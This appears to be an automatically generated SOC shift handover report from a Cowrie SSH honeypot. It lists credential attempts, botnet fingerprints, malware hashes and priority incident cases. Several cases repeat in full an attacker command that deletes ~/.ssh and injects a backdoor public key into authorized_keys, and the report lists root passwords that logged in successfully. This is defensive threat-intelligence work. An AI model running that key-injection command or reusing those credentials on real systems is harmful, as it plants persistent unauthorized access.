# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-18 |
| **Generated At** | 2026-05-18T16:49:57Z |
| **Shift Time** | 16:49 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **76** |
| Confirmed Threats | **64** |
| False Positives Filtered | **12** (15.8%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **9** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **66** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **9** |
| Unique Usernames | **5** |
| Unique Passwords | **9** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `zk` | 1 |
| `wangcx` | 1 |
| `pool` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `Q1w2e3r4!` | 2 |
| `123` | 1 |
| `1QA2ws3ed` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `Q1w2e3r4!` | 2 |
| `zk` | `123` | 1 |
| `root` | `1QA2ws3ed` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Q1w2e3r4!` | `40.78.155.180` | 2026-05-18T14:19:24 |
| `root` | `3245gs5662d34` | `40.78.155.180` | 2026-05-18T14:19:30 |
| `root` | `1QA2ws3ed` | `35.188.112.111` | 2026-05-18T14:27:11 |
| `root` | `3245gs5662d34` | `35.188.112.111` | 2026-05-18T14:27:17 |
| `root` | `Q1w2e3r4!` | `35.188.112.111` | 2026-05-18T14:29:01 |
| `root` | `Reza1234` | `35.188.112.111` | 2026-05-18T14:30:59 |
| `root` | `123qwe!@` | `35.188.112.111` | 2026-05-18T14:33:24 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **76** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 20 |
| Unknown | 2 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 19 | 3 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 19 | 3 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Unknown | 1 | 1 | — |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `40.78.155.180`, `35.188.112.111`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **13** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 4 | HIGH |
| `AS396982` | Google LLC | 4 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | LOW |
| `AS7029` | Windstream Communications LLC | 1 | LOW |
| `AS8151` | UNINET | 1 | LOW |
| `AS39273` | Kalaam Telecom Bahrain B.S.C. | 1 | LOW |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS267843` | TCA SERVICES C.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3d0133e949ae

| Field | Detail |
|---|---|
| **Source IP** | `40.78.155[.]180` |
| **First Seen** | 2026-05-18 14:19 |
| **Last Seen** | 2026-05-18 14:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:19:23` | `cowrie.session.connect` |
| `2026-05-18 14:19:23` | `cowrie.client.version` |
| `2026-05-18 14:19:23` | `cowrie.client.kex` |
| `2026-05-18 14:19:24` | `cowrie.login.success` |
| `2026-05-18 14:19:25` | `cowrie.session.params` |
| `2026-05-18 14:19:25` | `cowrie.command.input` |
| `2026-05-18 14:19:25` | `cowrie.command.failed` |
| `2026-05-18 14:19:25` | `cowrie.log.closed` |
| `2026-05-18 14:19:25` | `cowrie.session.params` |
| `2026-05-18 14:19:25` | `cowrie.command.input` |
| `2026-05-18 14:19:26` | `cowrie.session.file_download` |
| `2026-05-18 14:19:26` | `cowrie.log.closed` |
| `2026-05-18 14:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.78.155[.]180` to AbuseIPDB if not already reported
- [ ] Block `40.78.155[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a1bb3c219b

| Field | Detail |
|---|---|
| **Source IP** | `40.78.155[.]180` |
| **First Seen** | 2026-05-18 14:19 |
| **Last Seen** | 2026-05-18 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:19:28` | `cowrie.session.connect` |
| `2026-05-18 14:19:28` | `cowrie.client.version` |
| `2026-05-18 14:19:29` | `cowrie.client.kex` |
| `2026-05-18 14:19:30` | `cowrie.login.success` |
| `2026-05-18 14:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.78.155[.]180` to AbuseIPDB if not already reported
- [ ] Block `40.78.155[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ca99469c4e

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:27 |
| **Last Seen** | 2026-05-18 14:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:27:10` | `cowrie.session.connect` |
| `2026-05-18 14:27:10` | `cowrie.client.version` |
| `2026-05-18 14:27:10` | `cowrie.client.kex` |
| `2026-05-18 14:27:11` | `cowrie.login.success` |
| `2026-05-18 14:27:12` | `cowrie.session.params` |
| `2026-05-18 14:27:12` | `cowrie.command.input` |
| `2026-05-18 14:27:12` | `cowrie.command.failed` |
| `2026-05-18 14:27:12` | `cowrie.log.closed` |
| `2026-05-18 14:27:13` | `cowrie.session.params` |
| `2026-05-18 14:27:13` | `cowrie.command.input` |
| `2026-05-18 14:27:13` | `cowrie.session.file_download` |
| `2026-05-18 14:27:13` | `cowrie.log.closed` |
| `2026-05-18 14:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5cc85862079

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:27 |
| **Last Seen** | 2026-05-18 14:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:27:16` | `cowrie.session.connect` |
| `2026-05-18 14:27:16` | `cowrie.client.version` |
| `2026-05-18 14:27:16` | `cowrie.client.kex` |
| `2026-05-18 14:27:17` | `cowrie.login.success` |
| `2026-05-18 14:27:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6484977a59cd

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:29 |
| **Last Seen** | 2026-05-18 14:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:29:00` | `cowrie.session.connect` |
| `2026-05-18 14:29:00` | `cowrie.client.version` |
| `2026-05-18 14:29:00` | `cowrie.client.kex` |
| `2026-05-18 14:29:01` | `cowrie.login.success` |
| `2026-05-18 14:29:02` | `cowrie.session.params` |
| `2026-05-18 14:29:02` | `cowrie.command.input` |
| `2026-05-18 14:29:02` | `cowrie.command.failed` |
| `2026-05-18 14:29:02` | `cowrie.log.closed` |
| `2026-05-18 14:29:02` | `cowrie.session.params` |
| `2026-05-18 14:29:02` | `cowrie.command.input` |
| `2026-05-18 14:29:03` | `cowrie.session.file_download` |
| `2026-05-18 14:29:03` | `cowrie.log.closed` |
| `2026-05-18 14:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efa5869a2577

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:29 |
| **Last Seen** | 2026-05-18 14:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:29:05` | `cowrie.session.connect` |
| `2026-05-18 14:29:05` | `cowrie.client.version` |
| `2026-05-18 14:29:06` | `cowrie.client.kex` |
| `2026-05-18 14:29:07` | `cowrie.login.success` |
| `2026-05-18 14:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92ab51fa46ed

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:30 |
| **Last Seen** | 2026-05-18 14:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:30:58` | `cowrie.session.connect` |
| `2026-05-18 14:30:58` | `cowrie.client.version` |
| `2026-05-18 14:30:58` | `cowrie.client.kex` |
| `2026-05-18 14:30:59` | `cowrie.login.success` |
| `2026-05-18 14:31:00` | `cowrie.session.params` |
| `2026-05-18 14:31:00` | `cowrie.command.input` |
| `2026-05-18 14:31:00` | `cowrie.command.failed` |
| `2026-05-18 14:31:00` | `cowrie.log.closed` |
| `2026-05-18 14:31:01` | `cowrie.session.params` |
| `2026-05-18 14:31:01` | `cowrie.command.input` |
| `2026-05-18 14:31:01` | `cowrie.session.file_download` |
| `2026-05-18 14:31:01` | `cowrie.log.closed` |
| `2026-05-18 14:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd9cb5c22840

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:31 |
| **Last Seen** | 2026-05-18 14:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:31:04` | `cowrie.session.connect` |
| `2026-05-18 14:31:04` | `cowrie.client.version` |
| `2026-05-18 14:31:04` | `cowrie.client.kex` |
| `2026-05-18 14:31:05` | `cowrie.login.success` |
| `2026-05-18 14:31:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72928a30eefc

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:33 |
| **Last Seen** | 2026-05-18 14:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:33:23` | `cowrie.session.connect` |
| `2026-05-18 14:33:23` | `cowrie.client.version` |
| `2026-05-18 14:33:23` | `cowrie.client.kex` |
| `2026-05-18 14:33:24` | `cowrie.login.success` |
| `2026-05-18 14:33:24` | `cowrie.session.params` |
| `2026-05-18 14:33:24` | `cowrie.command.input` |
| `2026-05-18 14:33:24` | `cowrie.command.failed` |
| `2026-05-18 14:33:25` | `cowrie.log.closed` |
| `2026-05-18 14:33:25` | `cowrie.session.params` |
| `2026-05-18 14:33:25` | `cowrie.command.input` |
| `2026-05-18 14:33:25` | `cowrie.session.file_download` |
| `2026-05-18 14:33:25` | `cowrie.log.closed` |
| `2026-05-18 14:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d5154ebe0d7

| Field | Detail |
|---|---|
| **Source IP** | `35.188.112[.]111` |
| **First Seen** | 2026-05-18 14:33 |
| **Last Seen** | 2026-05-18 14:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-18 14:33:28` | `cowrie.session.connect` |
| `2026-05-18 14:33:28` | `cowrie.client.version` |
| `2026-05-18 14:33:29` | `cowrie.client.kex` |
| `2026-05-18 14:33:30` | `cowrie.login.success` |
| `2026-05-18 14:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.188.112[.]111` to AbuseIPDB if not already reported
- [ ] Block `35.188.112[.]111` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.148.120[.]187` | **35** | 2026-05-18 13:55 | 2026-05-18 16:46 | 43m | 0 | `T1592` | 🟠 MEDIUM |
| `35.188.112[.]111` | **7** | 2026-05-18 14:23 | 2026-05-18 14:35 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `18.116.202[.]164` | **3** | 2026-05-18 14:29 | 2026-05-18 14:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `175.107.31[.]20` | **2** | 2026-05-18 14:42 | 2026-05-18 15:00 | 1m | 0 | `T1592` | 🟢 LOW |
| `20.55.24[.]39` | **2** | 2026-05-18 16:34 | 2026-05-18 16:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.65.145[.]247` | **2** | 2026-05-18 14:46 | 2026-05-18 14:46 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.29.4[.]74` | 1 | 2026-05-18 14:23 | 2026-05-18 14:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.135.226[.]87` | 1 | 2026-05-18 16:24 | 2026-05-18 16:25 | 16s | 0 | `T1592` | 🟢 LOW |
| `40.78.155[.]180` | 1 | 2026-05-18 14:19 | 2026-05-18 14:19 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
